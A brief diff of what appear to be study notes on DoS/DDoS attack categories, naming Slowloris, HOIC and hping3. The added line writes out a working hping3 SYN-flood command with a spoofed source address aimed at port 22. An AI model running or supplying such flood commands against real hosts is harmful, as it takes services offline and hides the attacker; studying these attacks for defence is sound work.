@@ -7,5 +7,5 @@ Basic Categories of DOS/DDOS attack vectors
 
 Tools to use:
 - Slowloris attack (for HTTP)
-- SYN Flooding w Hping3 (windows10)
+- SYN Flooding w Hping3 (windows10) hping3 -S 10.10.10.10. -a 10.10.10.11 -p 22 --flood
 - HOIC
